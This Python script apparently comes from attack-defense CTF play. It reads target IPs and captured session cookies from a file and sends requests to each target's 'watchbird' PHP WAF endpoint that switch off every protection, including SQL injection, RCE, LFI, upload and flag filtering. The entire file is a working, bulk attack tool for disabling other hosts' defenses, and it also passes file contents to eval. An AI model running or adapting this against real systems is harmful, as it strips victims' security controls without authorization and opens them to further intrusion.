import requests
'''
使用cookie访问waf，关闭所有策略
'''
php = '.a.php'


def close_waf_param():
    targets = []
    # 读取cookie文件
    try:
        with open('./success_cookie.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
            current_ip = None
            current_cookie = None
            for line in lines:
                line = line.strip()
                if line.startswith("IP: "):
                    current_ip = line.replace("IP: ", "")
                elif line.startswith("Cookie: "):
                    cookie_str = line.replace("Cookie: ", "")
                    current_cookie = eval(cookie_str)
                elif line.startswith("-" * 50):
                    if current_ip and current_cookie:
                        targets.append({
                            "ip": current_ip,
                            "cookie": current_cookie
                        })
                    current_ip = None
                    current_cookie = None
    except FileNotFoundError:
        print("错误：未找到 success_cookie.txt 文件！")
        return

    if not targets:
        print("success_cookie.txt 内无有效IP与Cookie数据")
        return

    print(f"共读取到 {len(targets)} 个目标，开始关闭waf_sql参数\n")
    for item in targets:
        ip_addr = item["ip"]
        cookie = item["cookie"]
        try:
            # 关闭waf_sql，value=0
            oo = '0'
            url = ip_addr + php + '?watchbird=change&key=waf_sql&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_headers&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_ddos&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_upload&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_special_char&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_rce&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_ldpreload&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_lfi&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_unserialize&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=waf_flag&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=response_content_match&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=debug&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=scheduled_killall&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            url = ip_addr + php + '?watchbird=change&key=scheduled_killall_killweb&value=' + oo
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            print("-" * 50)
            print(f"目标IP：{ip_addr}")
            print(f"请求地址：{url}")
            print(f"返回数据：{resp.text}")
        except Exception as e:
            print("-" * 50)
            print(f"[{ip_addr}] 请求失败：{str(e)}")
    print("\n全部目标执行完毕")


if __name__ == "__main__":
    close_waf_param()
